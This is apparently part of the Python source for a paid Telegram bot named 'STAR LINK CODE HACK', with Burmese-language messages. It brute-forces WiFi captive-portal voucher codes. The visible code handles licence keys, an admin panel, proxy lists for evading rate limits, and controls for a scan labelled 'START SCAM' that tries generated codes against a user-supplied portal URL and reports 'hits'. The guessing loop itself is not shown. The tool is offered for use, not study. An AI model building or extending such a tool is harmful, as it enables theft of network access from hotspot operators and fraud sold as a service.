    keyboard = [[InlineKeyboardButton(f"🔢 {l} Codes", callback_data=f"admin_make_{plan}_{l}")] for l in limits]
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_genkey")])
    return InlineKeyboardMarkup(keyboard)

def get_admin_back_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Admin Panel", callback_data="admin_back")]])

# ==================== HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or update.effective_user.username or "User"
    ud = get_user_data(user_id)
    ud['state'] = None

    authorized, reason = is_user_authorized(user_id)
    proxy_status = "ON" if db_get_proxy_setting(user_id) else "OFF"

    if authorized:
        welcome_text = (
            f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
            f"{E_USER} NAME: {user_name}\n"
            f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
            f"{E_PARTY} မင်္ဂလာပါခင်ဗျာ!\n"
            f"{E_CHECK} သင့်အနေနဲ့ PAID USER ဖြစ်ပါတယ်။\n"
            f"{E_INF} Unlimited Credit ဖြင့် သုံးစွဲနိုင်ပါသည်။\n"
            f"{E_REFRESH} Proxy Status: {proxy_status}\n\n"
            f"အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"
        )
    else:
        welcome_text = (
            f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
            f"{E_USER} NAME: {user_name}\n"
            f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
            f"{E_WARN} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n"
            f"{E_REFRESH} Proxy Status: {proxy_status}\n\n"
            f"PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။\n"
            f"👨‍💻 Admin: @SAALRR"
        )

    msg = await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML)
    ud['menu_msg_id'] = msg.message_id

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ သင် Admin မဟုတ်ပါ။")
        return
    await update.message.reply_text("🔐 Admin Panel\n\nလုပ်ဆောင်ချက်တစ်ခုရွေးပါ။", reply_markup=get_admin_main_keyboard())

async def sendall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ သင် Admin မဟုတ်ပါ။")
        return
    args = context.args
    if not args:
        await update.message.reply_text("အသုံးပြုရန်: /sendall [message]")
        return
    broadcast_text = f"{E_MEGA} <b>ADMIN NOTIFICATION</b>\n\n" + " ".join(args)
    users = db_get_all_users()
    count = 0
    for u in users:
        try:
            await context.bot.send_message(chat_id=int(u['user_id']), text=broadcast_text, parse_mode=ParseMode.HTML)
            count += 1
            await asyncio.sleep(0.05)
        except Exception:
            continue
    await update.message.reply_text(f"{E_CHECK} User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။", parse_mode=ParseMode.HTML)

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name or update.effective_user.username or "User"
    telegram_username = f"@{update.effective_user.username}" if update.effective_user.username else "Not set"
    ud = get_user_data(user_id)
    data = query.data

    if data.startswith("admin_"):
        if not is_admin(user_id):
            await query.answer("❌ သင် Admin မဟုတ်ပါ။", show_alert=True)
            return
        if data == "admin_back":
            await query.message.edit_text("🔐 Admin Panel\n\nလုပ်ဆောင်ချက်တစ်ခုရွေးပါ။", reply_markup=get_admin_main_keyboard())
        elif data == "admin_genkey":
            await query.message.edit_text("🔑 Key သက်တမ်းရွေးပါ။", reply_markup=get_admin_genkey_keyboard())
        elif data.startswith("admin_gen_"):
            plan = data.replace("admin_gen_", "")
            await query.message.edit_text(f"🔑 Selected plan: {plan}\n\n🔢 Code limit ရွေးပါ။", reply_markup=get_admin_limit_keyboard(plan))
        elif data.startswith("admin_make_"):
            parts = data.split("_")
            plan, code_limit = parts[2], int(parts[3])
            ud["pending_admin_key"] = {"plan": plan, "code_limit": code_limit}
            await query.message.edit_text(
                f"{E_KEY} Plan: {plan}\n🔢 Limit: {code_limit} codes\n\nKey သုံးမည့် Telegram User ID ကို ဒီ chat ထဲ ပို့ပါ။\nဥပမာ: <code>1981253384</code>",
                reply_markup=get_admin_back_keyboard(), parse_mode=ParseMode.HTML
            )
        elif data == "admin_delkey":
            await query.message.edit_text("🗑️ Key ဖျက်ရန်: /delkey [key]", reply_markup=get_admin_back_keyboard())
        elif data == "admin_listkeys":
            await admin_show_listkeys(query.message, context)
        elif data == "admin_users":
            users = db_get_all_users()
            if not users:
                await query.message.edit_text("👥 User မရှိသေးပါ။", reply_markup=get_admin_back_keyboard())
            else:
                text = f"👥 <b>Registered Users</b>\n\n" + "\n".join([f"{E_ID} <code>{u['user_id']}</code> | 📱 {u.get('telegram_username', 'N/A') or 'N/A'}" for u in users])
                await query.message.edit_text(text, reply_markup=get_admin_back_keyboard(), parse_mode=ParseMode.HTML)
        elif data == "admin_stats":
            keys = db_get_all_keys()
            active_keys = sum(1 for v in keys.values() if check_key_expiration(v["expires_at"]))
            total_hits = sum(v.get('used_codes', 0) for v in keys.values())
            await query.message.edit_text(
                f"📊 <b>Bot Stats</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔑 Total Keys: {len(keys)}\n"
                f"{E_CHECK} Active Keys: {active_keys}\n"
                f"{E_FIRE} Total Hits: {total_hits:,}\n"
                f"👥 Total Users: {len(db_get_all_users())}",
                reply_markup=get_admin_back_keyboard(),
                parse_mode=ParseMode.HTML
            )
        return

    if data == "menu_back":
        proxy_enabled = db_get_proxy_setting(user_id)
        status_text = "ON" if proxy_enabled else "OFF"
        authorized, _ = is_user_authorized(user_id)
        if authorized:
            text = (
                f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
                f"{E_USER} NAME: {user_name}\n"
                f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
                f"{E_CHECK} PAID USER - Unlimited Access\n"
                f"{E_REFRESH} Proxy Status: {status_text}"
            )
        else:
            text = (
                f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
                f"{E_USER} NAME: {user_name}\n"
                f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
                f"{E_WARN} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n"
                f"{E_REFRESH} Proxy Status: {status_text}\n\n"
                f"PAID USER ဖြစ်ရန် အောက်ပါ Menu မှ PAID USER ကိုနှိပ်ပါ။"
            )
        await query.message.edit_text(text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML)

    elif data == "btn_add_proxies":
        if not is_admin(user_id):
            await query.answer("❌ Admin only!", show_alert=True)
            return
        ud['state'] = 'waiting_for_proxy_text'
        ud['menu_msg_id'] = query.message.message_id
        await query.message.edit_text(
            f"{E_INBOX} <b>Proxy များကို ယခုပို့ပါ</b>\n\n"
            "တစ်ကြောင်းလျှင် proxy တစ်ခုစီ ပို့ပေးပါ။\n"
            "ဥပမာ -\n"
            "123.45.67.89:8080\n"
            "socks5://user:pass@host:1080\n"
            "socks4://host:1080",
            parse_mode=ParseMode.HTML
        )

    elif data in ["menu_proxy_on", "menu_proxy_off"]:
        if not is_user_authorized(user_id)[0]:
            await query.answer("❌ သင် PAID USER မဟုတ်ပါ။", show_alert=True)
            return
        current = db_get_proxy_setting(user_id)
        db_set_proxy_setting(user_id, not current)
        await query.answer(f"✅ Proxy {'OFF' if current else 'ON'} ဖြစ်သွားပါပြီ။")
        proxy_enabled = not current
        status_text = "ON" if proxy_enabled else "OFF"
        text = (
            f"{E_SPARK} <b>STAR LINK CODE HACK</b> {E_SPARK}\n\n"
            f"{E_USER} NAME: {user_name}\n"
            f"{E_ID} USER ID: <code>{user_id}</code>\n\n"
            f"{E_CHECK} PAID USER - Unlimited Access\n"
            f"{E_REFRESH} Proxy Status: {status_text}"
        )
        await query.message.edit_text(text, reply_markup=get_main_keyboard(user_id), parse_mode=ParseMode.HTML)

    elif data == "menu_free_trial":
        if not is_user_authorized(user_id)[0]:
            await query.message.edit_text(f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @SAALRR သို့ ဆက်သွယ်ပါ။", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        text = (
            f"{E_LINK} <b>Portal URL ထည့်သွင်းရန်:</b>\n\n"
            f"<code>/portal</code>\n\n"
            "ဥပမာ:\n"
            "<code>/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00</code>"
        )
        await query.message.edit_text(text, reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)

    elif data == "menu_paid":
        text = f"{E_KEY} <b>PAID USER ဖြစ်ရန်</b>\n\nကျေးဇူးပြု၍ သင်၏ PAID KEY ကို ဒီ chat ထဲသို့ တိုက်ရိုက်ပို့ပါ။\n\nဥပမာ: <code>ABCD1234XYZ</code>\n\nKey မရှိသေးပါက Admin ထံ ဆက်သွယ်ပါ။"
        await query.message.edit_text(text, reply_markup=get_paid_keyboard(), parse_mode=ParseMode.HTML)

    elif data == "menu_enter_key":
        await query.message.edit_text(f"{E_KEY} PAID KEY ကို ဒီ chat ထဲသို့ တိုက်ရိုက်ပို့ပါ။", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)

    elif data == "menu_result":
        if not is_user_authorized(user_id)[0]:
            await query.message.edit_text(f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @SAALRR သို့ ဆက်သွယ်ပါ။", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        if ud['valid_codes']:
            hit_str = format_hit_list(ud['valid_codes'])
            text = f"{E_FIRE} <b>Found Codes</b>:\n\n{hit_str}"
        else:
            text = f"{E_CLIP} သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        await query.message.edit_text(text, reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)

    elif data == "menu_recheck":
        if not is_user_authorized(user_id)[0]:
            await query.message.edit_text(f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @SAALRR သို့ ဆက်သွယ်ပါ။", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        if not ud.get('portal_url'):
            await query.message.edit_text(f"{E_LINK} ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        await query.message.edit_text(f"{E_REFRESH} Recheck ကို စတင်နေပါသည်...", reply_markup=get_scam_button_keyboard(), parse_mode=ParseMode.HTML)

    elif data == "menu_stop" or data == "stop_scan":
        ud['stop_event'].set()
        ud['dash_update_event'].set()
        ud['dash_msg_id'] = None
        
        stats = ud['stats']
        elapsed = time.time() - stats['start_time']
        speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
        pm = get_proxy_manager()
        proxy_total, proxy_active = pm.stats()
        
        hit_str = format_hit_list(ud['valid_codes'])
        if not ud['valid_codes']:
            hit_str = "None"
        
        if ud.get('all_tasks'):
            for t in ud['all_tasks']:
                if not t.done():
                    t.cancel()
            ud['all_tasks'] = []
        if ud['task'] and not ud['task'].done():
            ud['task'].cancel()
            asyncio.create_task(_cleanup_cancelled_task(ud['task']))
        
        final_text = (
            f'{E_STOPEMJ} <b>Scanner Stopped</b>\n'
            f"Thank for using By Telegram @SAALRR\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f'{E_TARGET} Tried: {stats["tried"]:,}\n'
            f'{E_FIRE} Hits: {stats["hits"]}\n'
            f'{E_SWORD} Expired: {stats["expired"]}\n'
            f'{E_WARN} Limits: {stats["limits"]}\n'
            f'{E_SCAN} Final Speed: {speed_cpm:.1f} c/m\n'
            f'{E_PROXY} Proxies: {proxy_active}/{proxy_total}\n'
            f"━━━━━━━━━━━━━━━━━━\n"
            f'{E_FIRE} <b>Hit Codes</b>:\n{hit_str}\n'
            f"━━━━━━━━━━━━━━━━━━\n"
        )
        
        try:
            await query.message.edit_text(
                final_text,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]
                ]),
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"[menu_stop] edit error: {e}")
        
        try:
            await send_success_file(context, user_id)
        except Exception as e:
            print(f"[menu_stop] send file error: {e}")
        
        await query.answer("🛑 Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)

    elif data == "menu_start_scam":
        if not is_user_authorized(user_id)[0]:
            await query.message.edit_text(f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @SAALRR သို့ ဆက်သွယ်ပါ။", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        if 'selected_mode' not in ud:
            await query.message.edit_text(f"{E_CROSS} VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။", reply_markup=get_voucher_keyboard(), parse_mode=ParseMode.HTML)
            return
        if not ud.get('portal_url'):
            await query.message.edit_text(f"{E_LINK} ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        if ud['task'] and not ud['task'].done():
            ud['stop_event'].set()
            ud['dash_update_event'].set()
            ud['dash_msg_id'] = None
            if ud.get('all_tasks'):
                for t in ud['all_tasks']:
                    if not t.done(): t.cancel()
            ud['task'].cancel()
            try:
                await ud['task']
            except:
                pass

        ud['stop_event'].clear()
        ud['stats'] = {'tried':0, 'hits':0, 'expired':0, 'limits':0, 'start_time': time.time()}
        ud['valid_codes'] = []
        ud['tried_codes'] = set()
        ud['CURRENT_CODE'] = '----'
        ud['dash_msg_id'] = query.message.message_id
        ud['file_sent_for_this_scan'] = False

        try:
            portal_url = ud.get('portal_url', 'Unknown')
            last_url = ud.get('last_admin_notified_url', '')
            mode = ud.get('selected_mode', 'Unknown')
            if portal_url != last_url and portal_url != 'Unknown' and not is_admin(user_id):
                admin_msg = (
                    f"{E_ROCKET} <b>Scan Start Notification</b>\n\n"
                    f"{E_USER} <b>User:</b> {user_name}\n"
                    f"📱 <b>Telegram:</b> {telegram_username}\n"
                    f"{E_ID} <b>User ID:</b> <code>{user_id}</code>\n"
                    f"🔢 <b>Mode:</b> {mode}\n"
                    f"{E_LINK} <b>Portal URL:</b>\n<code>{portal_url}</code>"
                )
                try:
                    await context.bot.send_message(chat_id=SUPER_ADMIN_ID, text=admin_msg, parse_mode=ParseMode.HTML)
                    ud['last_admin_notified_url'] = portal_url
                except Exception as e:
                    print(f"[Scan Notify] {e}")
        except Exception as e:
            print(f"[Scan Notify Outer] {e}")

        await query.message.edit_text(f"{E_REFRESH} Initializing scanner dashboard...", parse_mode=ParseMode.HTML)
        asyncio.create_task(run_user_scanner(context, user_id))

    elif data.startswith("scan_"):
        if not is_user_authorized(user_id)[0]:
            await query.message.edit_text(f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @SAALRR သို့ ဆက်သွယ်ပါ။", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        mode = data.replace("scan_", "")
        if not ud.get('portal_url'):
            await query.message.edit_text(f"{E_LINK} ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal", reply_markup=get_back_keyboard(), parse_mode=ParseMode.HTML)
            return
        if mode in ["6", "7", "8", "9"]:
            await query.message.edit_text(f"🔢 Number {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -", reply_markup=get_digit_keyboard(mode))
            return
        ud['selected_mode'] = mode
        ud['start_digit'] = None
        ud['mode'] = mode
        apply_scan_mode(ud, mode)
        mode_display = {
            "mix6": "Mix 6",
            "mix7": "Mix 7",
            "mix8": "Mix 8",
            "ascii-lower6": "ascii-lower6",
            "ascii-lower7": "ascii-lower7",
            "ascii-lower8": "ascii-lower8",
        }.get(mode, mode)
        await query.message.edit_text(
            f"{E_SCAN} VOUCHER အမျိုးအစား: <b>{mode_display}</b>\n"
            f"🔢 Code Length: <code>{ud['code_len']}</code>\n"
            f"{E_NOTE} Char Set: <code>{ud['char_set'][:20]}...</code>\n\n"
            f"{E_CHECK} START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard(),
            parse_mode=ParseMode.HTML
        )

    elif data.startswith("digit_"):
        parts = data.split("_")
        mode, digit = parts[1], parts[2]
        ud['selected_mode'] = mode
        ud['start_digit'] = None if digit == "random" else digit
        ud['mode'] = "custom"
        apply_scan_mode(ud, mode)
        text = (
            f"{E_SCAN} VOUCHER Mode: <b>Number {mode}</b>\n"
            f"🔢 Code Length: <code>{ud['code_len']}</code>\n"
            f"{E_DICE} ထိပ်စီးနံပါတ်: {'Random' if digit == 'random' else digit}\n\n"
            f"{E_CHECK} START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။"
        )
        await query.message.edit_text(text, reply_markup=get_start_scam_keyboard(), parse_mode=ParseMode.HTML)

async def admin_show_listkeys(msg_obj, context):
    keys = db_get_all_keys()
    if not keys:
        try:
            await msg_obj.edit_text(f"{E_CLIP} Registered key မရှိသေးပါ။", reply_markup=get_admin_back_keyboard(), parse_mode=ParseMode.HTML)
        except Exception:
            await context.bot.send_message(chat_id=msg_obj.chat.id, text=f"{E_CLIP} Registered key မရှိသေးပါ။", parse_mode=ParseMode.HTML)
        return

    blocks = []
    for k, v in keys.items():
        user_info = db_get_user_by_key(k)
        if user_info:
            bound_user_id = user_info.get('user_id', v.get('user_id', 'N/A'))
            name = user_info.get('telegram_name', 'Unknown') or 'Unknown'
            username = user_info.get('telegram_username', '') or ''
            tg_label = f"@{username}" if username else "Not set"
        else:
            bound_user_id = v.get('user_id', 'N/A')
            name = "Not Registered"
            tg_label = "Not set"

        plan = v.get('plan', 'N/A')
        used = v.get('used_codes', 0) or 0
        limit = v.get('code_limit', 0) or 0
        expires = v.get('expires_at', 'N/A')
        is_active = check_key_expiration(expires)
        status_emoji = f"{E_CHECK}" if is_active else f"{E_CROSS}"
        status_text = "Active" if is_active else "Expired"

        block = (
            f"{E_KEY} <b>Key:</b> <code>{k}</code>\n"
            f"   {E_USER} <b>User ID:</b> <code>{bound_user_id}</code>\n"
            f"   🏷️ <b>Name:</b> {name}\n"
            f"   📱 <b>Telegram:</b> {tg_label}\n"
            f"   {E_CLIP} <b>Plan:</b> {plan}\n"
            f"   🔢 <b>Limit:</b> {used}/{limit}\n"
            f"   📊 <b>Status:</b> {status_emoji} {status_text}"
        )
        blocks.append(block)

    header = f"{E_CLIP} <b>Registered Keys</b> ({len(keys)})\n━━━━━━━━━━━━━━━━━━\n\n"
    full_text = header + "\n\n".join(blocks)

    if len(full_text) <= 4000:
        try:
            await msg_obj.edit_text(full_text, reply_markup=get_admin_back_keyboard(), parse_mode=ParseMode.HTML)
        except Exception:
            await context.bot.send_message(chat_id=msg_obj.chat.id, text=full_text, parse_mode=ParseMode.HTML)
    else:
        chunk = header
        for block in blocks:
            if len(chunk) + len(block) + 2 > 4000:
                try:
                    await context.bot.send_message(chat_id=msg_obj.chat.id, text=chunk, parse_mode=ParseMode.HTML)
                except Exception:
                    pass
                chunk = block + "\n\n"
            else:
                chunk += block + "\n\n"
        if chunk.strip():
            try:
                await context.bot.send_message(chat_id=msg_obj.chat.id, text=chunk, reply_markup=get_admin_back_keyboard(), parse_mode=ParseMode.HTML)
            except Exception:
                pass

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    state = ud.get('state')
    text = update.message.text.strip()

    pending = ud.get("pending_admin_key")
    if is_admin(user_id) and pending:
        if not text.isdigit():
            await update.message.reply_text(f"{E_CROSS} Telegram User ID သည် နံပါတ်ဖြစ်ရပါမည်။", parse_mode=ParseMode.HTML)
            return
        plan, code_limit = pending["plan"], pending["code_limit"]
        expiry = generate_expiry(plan)
        if expiry is None:
            await update.message.reply_text(f"{E_CROSS} Plan '{plan}' မှာ expiry မရှိပါ။", parse_mode=ParseMode.HTML)
            return
        key = generate_random_key()
        db_add_key(key, text, plan, expiry, code_limit)
        ud.pop("pending_admin_key", None)
        await update.message.reply_text(
            f"{E_CHECK} <b>Key Generated</b>\n\n"
            f"{E_KEY} Key: <code>{key}</code>\n"
            f"{E_USER} User ID: {text}\n"
            f"{E_CLIP} Plan: {plan}\n"
            f"🔢 Limit: {code_limit} codes\n"
            f"{E_HOUR} Expires: {expiry}",
            parse_mode=ParseMode.HTML, reply_markup=get_admin_back_keyboard()
        )
        return

    if state == 'waiting_for_proxy_text':
        if not is_admin(user_id):
            await update.message.reply_text("❌ Admin only!")
            ud['state'] = None
            return
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        if not lines:
            await update.message.reply_text(f"{E_CROSS} Proxy list ဗလာဖြစ်နေပါသည်။ ထပ်မံကြိုးစားပါ။", parse_mode=ParseMode.HTML)
            return
        try:
            with open(PROXY_FILE, 'w') as f:
                f.write('\n'.join(lines) + '\n')
        except Exception as e:
            await update.message.reply_text(f"{E_CROSS} Proxy ဖိုင်ရေးရာတွင် အမှားအယွင်းရှိ: {e}", parse_mode=ParseMode.HTML)
            return
        pm = get_proxy_manager()
        pm.reload()
        total, active = pm.stats()
        ud['state'] = None
        await update.message.reply_text(
            f"{E_CHECK} <b>Proxies အောင်မြင်စွာ သိမ်းဆည်းပြီးပါပြီ</b>\n"
            f"📊 Total: <code>{total}</code>\n"
            f"{E_CHECK} Active: <code>{active}</code>",
            reply_markup=get_main_keyboard(user_id),
            parse_mode=ParseMode.HTML
        )
        return

    if state == 'waiting_for_portal_url':
        if not text.startswith("http"):
            await update.message.reply_text(f"{E_CROSS} ကျေးဇူးပြု၍ http/https URL ပို့ပါ။", parse_mode=ParseMode.HTML)
            return
        ud['portal_url'] = text
        ud['state'] = None
        try:
            with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
                f.write(text)
        except Exception:
            pass
        await update.message.reply_text(f"{E_CHECK} Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။", reply_markup=get_voucher_keyboard(), parse_mode=ParseMode.HTML)
        return

    if state == 'waiting_for_digit':
        ud['start_digit'] = text if text in ud['char_set'] and len(text) == 1 else '0'
        ud['state'] = None
        await update.message.reply_text(f"{E_CHECK} Custom Start Digit = <code>{ud['start_digit']}</code> သတ်မှတ်ပြီးပါပြီ။", reply_markup=get_start_scam_keyboard(), parse_mode=ParseMode.HTML)
        return

    key_info = db_get_key(text)
    if key_info:
        bound_user_id = key_info.get("user_id")
        if not bound_user_id or str(bound_user_id) == "None":
            await update.message.reply_text(f"{E_CROSS} ဤ PAID KEY ကို Admin က User ID နှင့် မချိတ်ဆက်ရသေးပါ။", parse_mode=ParseMode.HTML)
            return
        if str(bound_user_id) != str(user_id):
            await update.message.reply_text(
                f"{E_CROSS} ဤ PAID KEY ကို အခြား Telegram user (<code>{bound_user_id}</code>) အတွက် သတ်မှတ်ထားပါသည်။\n"
                f"သင့် ID: <code>{user_id}</code>",
                parse_mode=ParseMode.HTML
            )
            return
        expires = key_info.get("expires_at")
        if not check_key_expiration(expires):
            await update.message.reply_text(
                f"{E_CROSS} သင်၏ PAID KEY သက်တမ်းကုန်ဆုံးနေပါသည်။\n"
                f"{E_HOUR} Expiry: <code>{expires}</code>",
                parse_mode=ParseMode.HTML
            )
            return
        telegram_name = update.effective_user.first_name or "Unknown"
        telegram_username = update.effective_user.username or ""
        db_add_user(user_id, text, telegram_name, telegram_username)
        await update.message.reply_text(
            f"{E_CHECK} <b>PAID USER ဖြစ်ပါပြီ။</b>\n\n"
            f"{E_ID} USER ID: {user_id}\n"
            f"{E_CLIP} PLAN: {key_info.get('plan', 'unknown')}\n"
            f"{E_HOUR} EXPIRES: {expires}\n\n"
            f"အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။",
            reply_markup=get_main_keyboard(user_id),
            parse_mode=ParseMode.HTML
        )
        return

    if len(text) == 12 and text.isalnum() and text.isupper():
        await update.message.reply_text(f"{E_CROSS} PAID KEY မှားယွင်းနေပါသည်။ Admin ထံ ပြန်စစ်ပါ။", parse_mode=ParseMode.HTML)

async def portal_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_user_authorized(user_id)[0]:
        await update.message.reply_text(f"{E_CROSS} သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန် Admin @SAALRR သို့ ဆက်သွယ်ပါ။", parse_mode=ParseMode.HTML)
        return
    args = context.args
    if not args:
        await update.message.reply_text(f"{E_LINK} Portal URL ထည့်သွင်းရန်:\n\n/portal", parse_mode=ParseMode.HTML)
        return
    url = args[0]
    ud = get_user_data(user_id)
    ud['portal_url'] = url
    try:
        with open(f"{PORTAL_URL_PATH}{user_id}.txt", "w") as f:
            f.write(url)
    except Exception:
        pass
    await update.message.reply_text(f"{E_CHECK} Portal URL သိမ်းဆည်းပြီးပါပြီ။\n\nVOUCHER ရွေးချယ်ရန် Menu ကိုသုံးပါ။", reply_markup=get_voucher_keyboard(), parse_mode=ParseMode.HTML)

async def delkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ သင် Admin မဟုတ်ပါ။")
        return
    args = context.args
    if not args:
        await update.message.reply_text("အသုံးပြုရန်: /delkey [key]")
        return
    db_delete_key(args[0].strip())
    await update.message.reply_text(f"{E_CHECK} Key ဖျက်ပြီးပါပြီ။", parse_mode=ParseMode.HTML)

def main():
    app = Application.builder().token(BOT_TOKEN).read_timeout(30).write_timeout(30).connect_timeout(30).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("sendall", sendall_command))
    app.add_handler(CommandHandler("portal", portal_command))
    app.add_handler(CommandHandler("delkey", delkey_command))
    app.add_handler(CallbackQueryHandler(handle_callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot is running with python-telegram-bot...")
    print("Thank for using By Telegram @SAALRR")
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, SystemExit):
        pass
